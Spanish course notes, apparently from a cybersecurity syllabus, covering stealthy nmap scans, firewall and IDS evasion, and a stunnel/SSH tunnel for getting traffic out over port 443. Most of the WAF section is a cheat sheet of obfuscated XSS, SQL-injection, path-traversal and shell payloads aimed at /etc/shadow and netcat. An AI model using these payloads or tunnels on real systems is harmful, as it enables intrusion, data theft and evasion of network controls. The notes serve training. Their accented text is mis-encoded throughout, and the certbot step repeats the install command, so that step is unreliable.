Al utilizar la opci√≥n -n, Nmap no intentar√° resolver nombres de host, lo que puede considerarse m√°s pasivo en comparaci√≥n con la resoluci√≥n de nombres.

### Escaneo de Puertos Service Version sin Ping:

> nmap -sV -Pn [objetivo]

Realiza un escaneo de versi√≥n de servicio sin enviar pings para determinar sistemas activos.

### Escaneo de Puertos UDP sin Resolver Nombres de Host:

> nmap -sU -n [objetivo]

Realiza un escaneo de puertos UDP sin resolver nombres de host, lo que puede ser considerado m√°s pasivo en comparaci√≥n con escaneos intensivos.

<aside>
üí° Es importante se√±alar que, aunque estos ejemplos son menos intrusivos, a√∫n pueden generar tr√°fico en la red y, en algunos casos, ser detectados por sistemas de seguridad. Adem√°s, siempre se debe obtener la debida autorizaci√≥n antes de realizar cualquier tipo de escaneo o evaluaci√≥n en una red o sistema.
</aside>

# T√©cnicas de evasi√≥n de firewall

## **T√©cnicas empleadas por los cortafuegos**

Los firewalls emplean al menos una de las siguientes t√©cnicas para realizar un seguimiento del tr√°fico de la red:

1. **Filtrado de paquetes** : la mayor√≠a de los firewalls son de este tipo. Peque√±os fragmentos de datos llamados paquetes son examinados por una serie de filtros cuando intentan ingresar a la red. Luego, seg√∫n el origen y el destino de las direcciones IP, protocolos y puertos, el firewall decide si se les permite ingresar o no.
2. **Firewall de aplicaci√≥n/puerta de enlace**: al filtrar el tr√°fico a nivel de aplicaci√≥n. Para evitar conexiones directas entre el dispositivo y los paquetes entrantes, los servidores proxy act√∫an como intermediarios.
3. **Firewall de pr√≥xima generaci√≥n** (NGFW): para defenderse contra ataques de red y basados ‚Äã‚Äãen la web, estos sofisticados firewalls integran tecnolog√≠as cl√°sicas de firewall de red con firewalls de aplicaciones web (WAF). Un NGFW tambi√©n incluye funciones adicionales que incluyen antivirus, inspecci√≥n de tr√°fico cifrado y sistemas de prevenci√≥n de intrusiones (IPS). La inspecci√≥n profunda de paquetes, que examina los datos en la carga √∫til del paquete en lugar de simplemente el encabezado del paquete, es una caracter√≠stica de un NGFW.
4. **Inspecci√≥n de estado** : esta es una t√©cnica m√°s reciente que examina el paquete en busca de rasgos distintivos particulares mientras compara componentes importantes del paquete con una base de datos. Se permite que el paquete pase si hay una coincidencia razonable.

> "**No permita que su firewall se convierta en un eslab√≥n d√©bil en su estrategia de ciberseguridad **"

# **M√©todos de evasi√≥n**

A pesar de que **los firewalls y los IDS** pueden impedir que paquetes maliciosos entren en una red, un atacante puede enviar paquetes modificados al objetivo para que pueda superar el IDS/Firewall. Estos son diez m√©todos de evasi√≥n:

1. **Cifrar datos** : al cifrar los datos que se transmiten, resulta m√°s dif√≠cil para el firewall o el sistema de detecci√≥n de intrusos detectar cualquier actividad maliciosa.
2. **VPN** : una red privada virtual (VPN) puede ayudar a eludir los firewalls y los sistemas de detecci√≥n de intrusiones al enrutar el tr√°fico a trav√©s de un servidor seguro.
3. **Servidor proxy** : un servidor proxy puede ayudar a enmascarar el origen del tr√°fico, lo que dificulta que el firewall o el sistema de detecci√≥n de intrusos rastreen el origen de un ataque.
4. **TOR** : La red TOR puede ayudar a ocultar la identidad del usuario y el origen del tr√°fico, lo que dificulta que el firewall o el sistema de detecci√≥n de intrusiones detecten cualquier actividad maliciosa.
5. **Salto de puerto** : al cambiar constantemente el puerto utilizado para transmitir datos, resulta m√°s dif√≠cil para el firewall o el sistema de detecci√≥n de intrusos detectar cualquier actividad maliciosa.
6. **Esteganograf√≠a** : al ocultar datos dentro de otro archivo o mensaje, resulta m√°s dif√≠cil para el firewall o el sistema de detecci√≥n de intrusos detectar cualquier actividad maliciosa.
7. **Protocolos de capa de aplicaci√≥n** : al utilizar protocolos de capa de aplicaci√≥n como HTTP o SMTP, resulta m√°s dif√≠cil para el firewall o el sistema de detecci√≥n de intrusos detectar cualquier actividad maliciosa.
8. **C√≥digo malicioso:** al utilizar c√≥digo malicioso o malware, resulta m√°s dif√≠cil para el firewall o el sistema de detecci√≥n de intrusiones detectar cualquier actividad maliciosa.
9. **Ingenier√≠a social** : al enga√±ar a los usuarios para que divulguen informaci√≥n confidencial o realicen determinadas acciones, resulta m√°s f√°cil para un atacante eludir el firewall o el sistema de detecci√≥n de intrusos.
10. **Acceso f√≠sico** : al acceder f√≠sicamente a la red o al sistema, un atacante puede eludir el firewall o el sistema de detecci√≥n de intrusos.
11. **Software obsoleto**: los cortafuegos dependen del software para funcionar correctamente y este software debe actualizarse peri√≥dicamente para mantenerse al d√≠a con las √∫ltimas amenazas. Si no actualiza su software de firewall, puede volverse vulnerable a ataques descubiertos desde la √∫ltima actualizaci√≥n.
12. **Contrase√±as d√©biles:** una contrase√±a segura y √∫nica es una de las formas m√°s importantes de proteger su firewall contra violaciones. Si utiliza una contrase√±a d√©bil o f√°cil de adivinar, los hackers pueden acceder f√°cilmente a su firewall y comprometer su sistema.
13. **Acceso remoto no seguro:** si permite el acceso remoto a su sistema, es esencial proteger este acceso con una contrase√±a segura y autenticaci√≥n de dos factores. Si no se toman estas medidas, los hackers pueden potencialmente obtener acceso a su firewall a trav√©s de acceso remoto.
14. **Reglas configuradas incorrectamente :** los firewalls se basan en reglas para determinar qu√© tr√°fico est√° permitido y qu√© est√° bloqueado. Si estas reglas no se configuran correctamente, es posible que se permita que tr√°fico no deseado atraviese el firewall y comprometa su sistema.

> Para proteger su firewall contra violaciones, es esencial actualizar peri√≥dicamente su software, usar contrase√±as seguras, protegerse contra infecciones de malware, proteger el acceso remoto y configurar correctamente las reglas de su firewall.

## **C√≥mo evadir un WAF**

### **¬øQu√© hacer para encontrar el proveedor de WAF y la direcci√≥n IP real?**

**Divulgaci√≥n de propiedad intelectual real**

> 1. EJECUTE shodan.io o censys.io
> 
> 
> 2. Busque registros SPF y registros TXT.
> 

Los registros SPF y TXT pueden tener una direcci√≥n IP de un punto de origen sin CloudFlare.

> 3. Tambi√©n puede consultar securitytrails.com en el campo Los datos hist√≥ricos pueden tener IP original en registros antiguos.

**C√≥mo probar que WAF est√© configurado correctamente:**

- Los WAF utilizan los puertos est√°ndar 80, 443, 8000, 8008, 8080 y 8088.
- Los WAF configuran sus propias cookies en las solicitudes.
- Los WAF se asocian con encabezados separados.
- Los WAF se exponen en el encabezado del servidor.
- Los WAF se exponen en el contenido de la respuesta.
- Los WAF responden con c√≥digos de respuesta √∫nicos ante solicitudes maliciosas.
- Env√≠e una solicitud GET est√°ndar desde un navegador, intercepte y registre encabezados de respuesta (cookies espec√≠ficas).
- Env√≠e una solicitud desde la l√≠nea de comando (por ejemplo, cURL) y luego verifique el contenido y los encabezados de la respuesta.
- Env√≠e solicitudes GET a puertos abiertos aleatorios y verifique pancartas que puedan exponer la identidad de los WAF.
- Pruebe algunas cargas √∫tiles de inyecci√≥n SQL como: ‚Äùo 1 = 1: para iniciar sesi√≥n en formularios u olvidar una contrase√±a.
- Pruebe con cargas √∫tiles XSS ruidosas como <script>confirm()</script> en algunos campos de entrada.
- Intente agregar ../../../etc/passwd a un par√°metro aleatorio en la direcci√≥n URL.
- Agregue algunas cargas √∫tiles como ' OR SLEEP(5) OR ' al final de las URL a cualquier par√°metro aleatorio.
- Env√≠e solicitudes GET con protocolos obsoletos como HTTP/0.9 (HTTP/0.9 no admite consultas de tipo POST).
- Consulte el encabezado del servidor sobre diferentes tipos de interacciones.
- Env√≠e un paquete FIN&RST sin procesar al servidor e identifique una respuesta.
- Ataques de canal lateral: examine el comportamiento temporal del contenido de la solicitud y la respuesta.

## **Herramientas para verificar y omitir WAF:**

> w3af : marco de auditor√≠a y ataque de aplicaciones web
> 
> 
> **[wafw00f](https://github.com/EnableSecurity/wafw00f)** ‚Äî Identificar y tomar huellas dactilares del firewall de aplicaciones web
> 
> **[BypassWAF](https://github.com/vincentcox/bypass-firewalls-by-DNS-history) :** evita los firewalls abusando del historial de DNS. Esta herramienta buscar√° registros DNS A antiguos y comprobar√° si el servidor responde para ese dominio.
> 
> **[CloudFail](https://github.com/m0rtem/CloudFail)** : es una herramienta de reconocimiento t√°ctico que intenta encontrar la direcci√≥n IP original detr√°s del WAF de Cloudflare.

## **T√©cnicas para evitar WAF:**

### **1. T√©cnica de alternancia de casos**

Combine caracteres en may√∫sculas y min√∫sculas para crear cargas √∫tiles eficientes.

**Solicitud b√°sica:**

> <script>confirm()</script>

**T√©cnica omitida:**

> <ScrIpT>confirm()</sCRiPt>

**Solicitud b√°sica:**

> SELECT * FROM * WHERE OWNER = 'NAME_OF_DB'

**T√©cnica omitida:**

> sELeCt * fRoM * wHerE OWNER = 'NAME_OF_DB'

**Ejemplo en URL:**

> http://example.com/index.php?page_id=-1 UnIoN SeLeCT 1,2,3,4

### **2. T√©cnica de codificaci√≥n de URL**

> Codifique cargas √∫tiles normales con % de codificaci√≥n/codificaci√≥n de URL. Puedes usar Burp Suite. Dispone de una herramienta codificadora/decodificadora.

**Bloqueado por WAF:**

> <Svg/x=">"/OnLoAD=confirm()//

**T√©cnica omitida:**

> %3CSvg%2Fx%3D%22%3E%22%2FOnLoAD%3Dconfirm%28%29%2F%2F

**Bloqueado por WAF:**

> UniOn(SeLeCt 1,2,3,4,5,6,7,8,9,10)

**T√©cnica omitida:**

> UniOn%28SeLeCt+1%2C2%2C3%2C4%2C5%2C6%2C7%2C8%2C9%2C10%29

**Ejemplo en URL:**

> https://example.com/page.php?id=1%252f%252a*/UNION%252f%252a /SELECT

### **3. T√©cnica Unicode**

Los caracteres ASCII en codificaci√≥n Unicode nos brindan excelentes variantes para evitar WAF. Codifique toda o parte de la carga √∫til para obtener resultados.

**Solicitud b√°sica:**

> <marquee onstart=prompt()>

**Ofuscado:**

> <marquee onstart=\u0070r\u06f\u006dpt()>

**Bloqueado por WAF:**

> /?redir=http://google.com

**T√©cnica omitida:**

> /?redir=http://google„ÄÇcom (Unicode alternative)

**Bloqueado por WAF:**

> <marquee loop=1 onfinish=alert()>x

**T√©cnica omitida:**

> Ôºúmarquee loopÔºù1 onfinishÔºùalertÔ∏µ1)>x (Unicode alternative)

**Solicitud b√°sica:**

> ../../etc/shadow

**Ofuscado:**

> %C0AE%C0AE%C0AF%C0AE%C0AE%C0AFetc%C0AFshadow

### **4. T√©cnica de representaci√≥n HTML**

Las aplicaciones web codifican caracteres especiales en HTML. Codificarlos y renderizarlos en consecuencia. Casos de bypass b√°sicos con codificaci√≥n HTML num√©rica y gen√©rica.

**Solicitud b√°sica:**

> "><img src=x onerror=confirm()>

**Carga √∫til codificada:**

> &quot;&gt;&lt;img src=x onerror=confirm&lpar;&rpar;&gt;

**Carga √∫til codificada:**

> &#34;&#62;&#60;img src=x onerror=confirm&#40;&#41;&#62;

### **5. T√©cnica de codificaci√≥n mixta**

Estas reglas suelen tender a filtrar un tipo espec√≠fico de codificaci√≥n. Estos filtros pueden evitarse mediante cargas √∫tiles de codificaci√≥n mixta. Nuevas l√≠neas y tabulaciones y se agregan m√°s a la ofuscaci√≥n.

**Ofuscar carga √∫til:**

> <A HREF="h
> 
> 
> tt p://6 6.000146.0x7.147/">XSS</A>
> 

### **6. Uso de la t√©cnica de comentarios**

Los comentarios ofuscan los vectores de carga √∫til est√°ndar. Diferentes cargas √∫tiles tienen diferentes formas de ofuscarse.

**Bloqueado por WAF:**

> <script>confirm()</script>

**T√©cnica omitida:**

> <!--><script>confirm/**/()/**/</script>

**Bloqueado por WAF:**

> /?id=1+union+select+1,2--

**T√©cnica omitida:**

> /?id=1+un/**/ion+sel/**/ect+1,2--

Inserte comentarios en medio de las cadenas de ataque. Por ejemplo, /*!SELECT*/ puede ser pasado por alto por el WAF pero pasado a la aplicaci√≥n de destino y procesado por una base de datos mysql.

**Ejemplo en URL:**

> index.php?page_id=-1 %55nION/**/%53ElecT 1,2,3,4
> 
> 
> 'union%a0select pass from users#
> 

**Ejemplo en URL:**

> index.php?page_id=-1 /*!UNION*/ /*!SELECT*/ 1,2,3
> 

### **7. T√©cnica de doble codificaci√≥n**

Los filtros de Web Application Firewall tienden a codificar caracteres para proteger la aplicaci√≥n web. Los filtros mal desarrollados (sin filtros de recursividad) se pueden omitir con doble codificaci√≥n.

**Solicitud b√°sica:**

> http://example/cgi/../../winnt/system32/cmd.exe?/c+dir+c:\

**Ofuscar carga √∫til:**

> http://example/cgi/%252E%252E%252F%252E%252E%252Fwinnt/system32/cmd.exe?/c+dir+c:\

**Solicitud b√°sica:**

> <script>confirm()</script>

**Ofuscar carga √∫til:**

> %253Cscript%253Econfirm()%253C%252Fscript%253E

### **8. T√©cnica de ofuscaci√≥n con comodines**

Varias utilidades de l√≠nea de comandos utilizan patrones globales para trabajar con varios archivos. Podemos cambiarlos para ejecutar comandos del sistema.

**Solicitud b√°sica:**

> /bin/cat /etc/passwd

**Ofuscar carga √∫til:**

> /???/??t /???/??ss??

**Caracteres usados:**

> / ? t s

**Solicitud b√°sica:**

> /bin/nc 127.0.0.1 443

**Ofuscar carga √∫til:**

> /???/n? 2130706433 443

**Caracteres usados:**

> / ? n [0-9]

### **9. T√©cnica de generaci√≥n de carga √∫til din√°mica:**

Los lenguajes de programaci√≥n tienen diferentes patrones y sintaxis para la concatenaci√≥n. Esto nos permite generar cargas √∫tiles que pueden eludir muchos filtros y reglas.

**Solicitud b√°sica:**

> <script>confirm()</script>

**Ofuscar carga √∫til:**

> <script>eval('con'+'fi'+'rm()')</script>

**Solicitud b√°sica:**

> /bin/cat /etc/shadow

**Ofuscar carga √∫til:**

> /bi'n'''/c''at' /e'tc'/sh''ad'ow

Bash permite la concatenaci√≥n de rutas para su ejecuci√≥n.

**Solicitud b√°sica:**

> <iframe/onload='this["src"]="javascript:confirm()"';>

**Ofuscar carga √∫til**

> <iframe/onload='this["src"]="jav"+"as&Tab;cr"+"ipt:con"+"fir"+"m()"';>

### **10. T√©cnica de personajes basura**

WAF filtra f√°cilmente las cargas √∫tiles simples. Agregar algunos caracteres basura ayuda a evitar la detecci√≥n (solo en casos espec√≠ficos). Esta t√©cnica a menudo ayuda a confundir los firewalls basados ‚Äã‚Äãen expresiones regulares.

**Solicitud b√°sica:**

> <script>confirm()</script>

**Ofuscar carga √∫til:**

> <script>+-+-1-+-+confirm()</script>

**Solicitud b√°sica:**

> <BODY onload=confirm()>

**Ofuscar carga √∫til:**

> <BODY onload!#$%&()*~+-_.,:;?@[/|\]^`=confirm()>

**Solicitud b√°sica:**

> <a href=javascript;alert()>ClickMe

**T√©cnica omitida:**

> <a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaaa href=j&#97v&#97script&#x3A;&#97lert(1)>ClickMe

### **11. T√©cnica de saltos de l√≠nea**

Muchos WAF con filtrado basado en expresiones regulares bloquean eficazmente muchos intentos. La t√©cnica de saltos de l√≠nea (CR y LF) puede romper la expresi√≥n regular del firewall y omitir cosas.

**Solicitud b√°sica:**

> <iframe src=javascript:confirm(hacker)">

**Ofuscar carga √∫til:**

> <iframe src="%0Aj%0Aa%0Av%0Aa%0As%0Ac%0Ar%0Ai%0Ap%0At%0A%3Aconfirm(hacker)">

### **12. T√©cnica de variables no inicializadas**

Los filtros basados ‚Äã‚Äãen expresiones regulares incorrectos se pueden evadir con variables bash no inicializadas. Dicho valor es igual a nulo y act√∫a como cadenas vac√≠as. Bash y Perl permiten este tipo de interpretaciones.

Ofuscaci√≥n de primer nivel: normal

**Solicitud b√°sica:**

> /bin/cat /etc/shadow

**Ofuscar carga √∫til:**

> /bin/cat$u /etc/shadow$u

Ofuscaci√≥n de segundo nivel: basada en la posici√≥n

**Solicitud b√°sica:**

> /bin/cat /etc/shadow

**Ofuscar carga √∫til:**

> $u/bin$u/cat$u $u/etc$u/shadow$u

Ofuscaci√≥n de tercer nivel: caracteres aleatorios

**Solicitud b√°sica:**

> /bin/cat /etc/passwd

**Ofuscar carga √∫til:**

> $aaaaaa/bin$bbbbbb/cat$ccccccc $dddddd/etc$eeeeeee/passwd$fffffff

### **13. T√©cnica de tabulaciones y avances de l√≠nea**

Las pesta√±as a menudo ayudan a evadir los firewalls, especialmente los basados ‚Äã‚Äãen expresiones regulares. Las pesta√±as pueden ayudar a romper la expresi√≥n regular WAF cuando la expresi√≥n regular espera espacios en blanco y no pesta√±as.

**Solicitud b√°sica:**

> <IMG SRC="javascript:confirm();">

**T√©cnica omitida:**

> <IMG SRC=" javascript:confirm();">

**Variante:**

> <IMG SRC=" jav ascri pt:confirm ();">

**Solicitud b√°sica:**

> http://test.com/test?id=1 union select 1,2,3

**T√©cnica omitida** :

> http://test.com/test?id=1%09union%23%0A%0Dselect%2D%2D%0A%0D1,2,3

**Solicitud b√°sica:**

> <iframe src=javascript:confirm()></iframe>

**Ofuscar carga √∫til:**

> <iframe src=j&Tab;a&Tab;v&Tab;a&Tab;s&Tab;c&Tab;r&Tab;i&Tab;p&Tab;t&Tab;:c&Tab;o&Tab;n&Tab;f&Tab;i&Tab;r&Tab;m&Tab;%28&Tab;%29></iframe>

### 14. T√©cnica para romper fichas

Los ataques a tokens intentan romper la l√≥gica de dividir una solicitud en tokens con disyuntores de tokens. Los token-breakers son s√≠mbolos que permiten afectar la correspondencia entre un elemento de una cadena y un determinado token. Nuestra solicitud debe seguir siendo v√°lida mientras utilizamos rompedores de tokens.

Estudio de caso: token desconocido para el "tokenizador"

**Nuestra carga √∫til:**

> ?id=‚Äò-sqlite_version() UNION SELECT passwords FROM users --

Estudio de caso: contexto desconocido para el analizador (observe el corchete sin contexto)

**Primera carga √∫til:**

> ?id=12);DROP TABLE users --

**Segunda carga √∫til:**

> ?id=133) INTO OUTFILE ‚Äòxxx‚Äô --

### 15. T√©cnica de ofuscaci√≥n en otros formatos.

Muchas aplicaciones web admiten diferentes tipos de codificaci√≥n y pueden interpretar la codificaci√≥n. Siempre necesitamos ofuscar la carga √∫til a un formato que no sea compatible con WAF, pero el servidor puede pasar de contrabando nuestra carga √∫til.

Caso IIS:

IIS 6, 7.5, 8 y 10 permiten interpretaciones de caracteres IBM037. Env√≠e los par√°metros codificados con la consulta.

**Solicitud original:**

> POST /example.aspx?id7=sometext HTTP/1.1
> 
> 
> HOST: target.org
> 
> Content-Type: application/x-www-form-urlencoded; charset=utf-8
> 
> Content-Length: 27
> 
> id2='union all select * from users--

**Solicitud ofuscada con codificaci√≥n de URL:**

> POST /example.aspx?%89%84%F7=%A2%95%94%86%A3%88%89%95%87 HTTP/1.1
> 
> 
> HOST: target.org
> 
> Content-Type: application/x-www-form-urlencoded; charset=ibm037
> 
> Content-Length: 127
> 
> %89%84%F2=%7D%A4%95%89%97%95%40%81%93%94%40%A2%85%93%85%84%A3%40%5C%40%86%99%97%94%40%A4%A2%85%99%A2%60%60

## **NMAP - Script firewall-bypass**

Detecta una vulnerabilidad en netfilter y otros firewalls que utilizan ayudas para abrir din√°micamente puertos para protocolos como ftp y sip. El script funciona falsificando un paquete del servidor de destino solicitando abrir una conexi√≥n relacionada a un puerto de destino que ser√° cumplida por el firewall a trav√©s del puerto auxiliar de protocolo adecuado. Para que esto funcione, la m√°quina atacante debe estar en el mismo segmento de red que el firewall. El script admite el asistente ftp tanto en IPv4 como en IPv6. El filtro de ruta real se utiliza para prevenir este tipo de ataques.

Descarga: ¬†[**https://svn.nmap.org/nmap/scripts/firewall-bypass.nse**](https://svn.nmap.org/nmap/scripts/firewall-bypass.nse)

Para m√°s informaci√≥n, ver:

- **[http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/](http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/)**

**Argumentos**

> firewall-bypass.helper
> 
> 
> El ayudante a utilizar. El valor predeterminado es ftp. Ayudantes compatibles: ftp (tanto IPv4 como IPv6).
> 
> **firewall-bypass.targetport**
> 
> Puerto para probar la vulnerabilidad. El puerto de destino debe ser un puerto no abierto. Si no se proporciona, el script intentar√° encontrar un puerto filtrado o cerrado a partir de los resultados del escaneo de puertos.
> 
> **firewall-bypass.helperport**
> 
> Si no utiliza el puerto predeterminado del asistente.
> 

**Ejemplos**

> nmap --script firewall-bypass <objetivo>
> 
> 
> nmap --script firewall-bypass --script-args firewall-bypass.helper="ftp", firewall-bypass.targetport=22 <destino>
> 

**Salida**

> Resultados del script del host:
> 
> 
> | omisi√≥n de firewall:
> 
> |_ Firewall vulnerable a omisi√≥n a trav√©s del asistente ftp. (IPv4)
> 

**C√≥mo evitar los firewalls ocultando todo el tr√°fico en el tr√°fico encapsulado HTTPS(SSL)443**

Por lo general, cuando se est√° detr√°s de un firewall p√∫blico o bloqueado, la mayor√≠a del tr√°fico de salida (saliente) permitido es el puerto 80(http) y 443(https). Esto es para permitir s√≥lo la navegaci√≥n web y evitar el uso de otras aplicaciones y servicios como el correo electr√≥nico o los juegos. El tr√°fico web saliente tambi√©n se puede restringir mediante el filtrado de contenido, permitiendo a qu√© tipo de sitios web se puede acceder. Otra gran preocupaci√≥n es la privacidad. Cuando utiliza redes p√∫blicas o incluso utiliza la red de su propio ISP, todo su tr√°fico es visible para ellos.

Con esta configuraci√≥n de proxy inverso podemos enmascarar todo nuestro tr√°fico para que aparezca esencialmente como tr√°fico HTTPS, lo que nos permite evitar muchas de estas restricciones. Esto tambi√©n se puede utilizar como alternativa a las VPN o junto con VPN para enmascarar a√∫n m√°s el tr√°fico y proporcionar m√°s privacidad. Este m√©todo funcionar√° en la mayor√≠a de las situaciones. A veces, se configura la inspecci√≥n SSL o se aprovecha el filtrado de contenido avanzado y/o la inteligencia sobre amenazas, lo que aumenta los factores de bloqueo del tr√°fico. Sin embargo, estos escenarios normalmente s√≥lo ocurren en entornos corporativos maduros y no en las redes p√∫blicas promedio.

Alojaremos un proxy inverso en Internet. Con una herramienta llamada stunnel podemos crear un t√∫nel de reenv√≠o de puertos cifrados a trav√©s de una conexi√≥n 443 (HTTPS). Luego usaremos ese reenv√≠o de puerto para crear un t√∫nel ssh oculto dentro del tr√°fico 443(ssl) cifrado que nos permitir√° configurar un proxy de sockets anidado O un reenv√≠o de puerto que a su vez nos permitir√° enviar cualquier tr√°fico que queramos fuera de la red.

![firewall-bypass](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/firewall-bypass.png?raw=true)

### **Requisitos**

Para esta implementaci√≥n usar√© un VPS (servidor privado virtual) Ubuntu 23.04 para el servidor proxy inverso y Kali 6.3.0 para la m√°quina cliente . Esta configuraci√≥n no requiere estos sistemas operativos espec√≠ficamente. Si decide utilizar diferentes sistemas operativos, aseg√∫rese de que las herramientas sean compatibles.

Servidor proxy inverso:

- [LetsEncrypt (servicio de certificado SSL gratuito)](https://letsencrypt.org/docs/faq/)
- Dominio comprado para crear un certificado SSL v√°lido (puede ser un dominio econ√≥mico, es decir, $1,99/a√±o)

Herramientas/Servicios

- [apache2](https://httpd.apache.org/)
- [certbot](https://certbot.eff.org/)
- [stunnel(server mode)](https://www.stunnel.org/)

M√°quina cliente:

Herramientas

- [stunnel (modo cliente)](https://www.stunnel.org/)

### **Configuraci√≥n**

Servidor Proxy inverso

El servidor requerir√° el mayor esfuerzo de configuraci√≥n. Como se trata de una nueva instalaci√≥n de Ubuntu, actualizaremos y actualizaremos el servidor.

> sudo apt update && sudo apt upgrade -y

Ahora necesitamos instalar el servicio apache2 y luego ejecutar certbot para recibir nuestro certificado SSL de LetsEncrypt. Esto nos permite recibir un certificado SSL firmado relacionado con nuestro dominio para el servidor proxy inverso.

**Instalar Apache2**

> sudo apt update
> 
> 
> sudo apt install apache2
> 

Teniendo en cuenta que el servidor ejecuta servicios y es accesible desde Internet, crearemos reglas de firewall basadas en host.

Crear reglas de firewall basadas en host

> sudo ufw allow 22/tcp
> 
> 
> sudo ufw allow 80/tcp
> 
> sudo ufw allow 443/tcp

No dude en agregar m√°s reglas de firewall que sean necesarias para cualquier otro servicio que decida ejecutar. Ahora que se crearon las reglas, debemos habilitarlas.

Habilitar reglas de firewall

> sudo ufw reload

Habilitar el servicio Apache2

> sudo systemctl start apache2

Ahora, como se explica en el sitio web de certbot, utilizaremos el servicio apache2 para solicitar nuestro certificado SSL firmado para el dominio comprado. Si a√∫n no posee uno, este es el momento de comprar un dominio antes de continuar. El dominio que adquirimos es importante porque aqu√≠ es hacia1 donde se ver√° todo nuestro tr√°fico tunelizado cuando pase a trav√©s de la red y el firewall. Elija un nombre de dominio gen√©rico o inocente con un dominio de nivel superior com√∫n como .com, .net, .io, etc. (Se sabe que los firewalls con inteligencia de amenazas bloquean dominios baratos o poco comunes como .xyz)

El registrador suele proporcionar servicios DNS que utilizar√° para el dominio que compr√≥. Una vez que haya creado un registro DNS A y apunte a su servidor proxy inverso, estar√° listo para recibir su certificado SSL utilizando certbot. Certbot es un script que automatiza la creaci√≥n de certificados SSL con LetsEncrypt. Para ver instrucciones espec√≠ficas, que pueden variar seg√∫n el sistema operativo de su servidor proxy inverso, [visite aqu√≠](https://certbot.eff.org/instructions)

**Instalar Certbot**

> sudo snap install --classic certbot
> 
> 
> sudo ln -s /snap/bin/certbot /usr/bin/certbot

Antes de ejecutar cerbot, editaremos el archivo de configuraci√≥n /etc/apache2/sites-available/000-default.conf para que el script cerbot pueda identificar nuestro servidor por el nombre de dominio adquirido.

Editar el archivo de configuraci√≥n de Apache2

> sudo vim /etc/apache2/sites-available/000-default.conf

Agregue la siguiente l√≠nea al archivo de configuraci√≥n.

> ServerName yourdomain.net

![yourdomain.net](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net.png?raw=true)

Ahora es el momento de recibir nuestro certificado SSL y comenzar la configuraci√≥n de Stunnel.

Ejecutar certbot

> sudo snap install --classic certbot

Una vez que esto se ejecute correctamente, deber√≠a ver el resultado de d√≥nde se encuentran su nuevo certificado SSL y clave privada.

> cert = /etc/letsencrypt/live/yourdomain.net/fullchain.pem
> 
> 
> key = /etc/letsencrypt/live/yourdomain.net/privkey.pem

Ya no necesitamos el servicio apache2 ahora que hemos usado certbot para obtener nuestro certificado SSL v√°lido. El servicio debe detenerse para que stunnel pueda utilizar m√°s tarde el puerto de escucha 443.

Detener el servicio Apache2

> sudo systemctl stop apache2

Ahora se puede configurar Stunnel. Inst√°lelo en el servidor proxy inverso.

Instalar Stunnel

> sudo apt update
> 
> 
> sudo apt install stunnel4

Cree/edite el archivo de configuraci√≥n de stunnel en el servidor para usar nuestro nuevo certificado SSL. Definiremos su puerto de escucha e instrucciones de reenv√≠o.

> sudo vim /etc/stunnel/stunnel.conf

Agregue las siguientes l√≠neas al archivo de configuraci√≥n

> pid = /var/run/stunnel.pid
> 
> 
> cert = /etc/letsencrypt/live/yourdomain.net/fullchain.pem
> 
> key = /etc/letsencrypt/live/yourdomain.net/privkey.pem
> 
> [ssh]
> 
> accept = 0.0.0.0:443
> 
> connect = localhost:22

![yourdomain.net1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net1.png?raw=true)

Edite el archivo de configuraci√≥n adicional de stunnel para habilitar el servicio

> sudo vim /etc/default/stunnel4

Agregue la siguiente l√≠nea al final del archivo de configuraci√≥n

> ENABLED=1

![yourdomain.net2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net2.png?raw=true)

Iniciar el servicio de t√∫nel

> sudo /etc/init.d/stunnel4 restart 

Para asegurarse de que el servicio stunnel se est√© ejecutando y escuchando en el puerto 443 especificado, ejecute el siguiente comando

> sudo netstat -ano | grep tcp

![yourdomain.net3](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/yourdomain.net3.png?raw=true)

Si ve que su servidor proxy inverso est√° escuchando en el puerto 443 despu√©s de iniciar el servicio stunnel, ¬°ya est√° todo listo! Ahora pasemos a la m√°quina cliente, configuremos el cliente stunnel y comencemos a omitirlo.

### M√°quina cliente

Actualice y actualice la nueva instalaci√≥n de Kali en la m√°quina cliente.

> sudo apt update && sudo apt upgrade -y

Ahora que nuestra m√°quina cliente est√° actualizada y lista para funcionar, necesitamos instalar stunnel.

**Instalar Stunnel**

> sudo apt install stunnel4

Cree un archivo de configuraci√≥n para el cliente stunnel. Esto se puede crear en cualquier lugar, pero yo crear√© el m√≠o en el directorio $HOME.

Crear archivo de configuraci√≥n

> vim $HOME/stunnel-client.conf

Agregue las siguientes l√≠neas al archivo de configuraci√≥n

> pid = /tmp/stunnel.pid
> 
> 
> client=yes
> 
> [ssh]
> 
> accept=9443
> 
> connect=yourdomain.net:443

![Maquina Cliente1](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente1.png?raw=true)

Ejecute el cliente stunnel para conectarse al servidor proxy inverso estableciendo el t√∫nel ssl(443)

> sudo stunnel $HOME/stunnel-client.conf

Ahora confirme si el cliente est√° escuchando en su puerto de reenv√≠o definido en el archivo de configuraci√≥n.

> sudo netstat -ano | grep tcp

![Maquina Cliente2](https://github.com/4GeeksAcademy/cybersecurity-syllabus/blob/main/assets/maquina-cliente2.png?raw=true)

**Evitando**

El servidor proxy inverso est√° completamente instalado y configurado. Podemos conectarnos exitosamente desde nuestra m√°quina cliente usando stunnel para crear el t√∫nel ssl(443). Ahora configuraremos nuestro puerto SSH forward o proxy de sockets¬† que estar√° oculto dentro de nuestro t√∫nel ssl(443).

sockets SSH 4/5 Proxy

Este t√∫nel SSH abrir√° un proxy de sockets¬† en la m√°quina cliente que reenviar√° cualquier tr√°fico que se le env√≠e a trav√©s del t√∫nel ssh que est√° oculto dentro del t√∫nel ssl(443).

Crear el t√∫nel proxy ssh sock

> sudo ssh -D 9090 -q -C -N <user>@127.0.0.1 -p 9443
> 
> - D : specifies the listening port of the socks proxy on the client
> - q : runs quiet mode where no output is displayed locally
> - C : compress data in the tunnel to save bandwidth
> - N : non interactive ssh session just creats the tunnel no command prompt
> - p : defines the destination port to connect to (We are conencting to port forward provided by stunnel client)

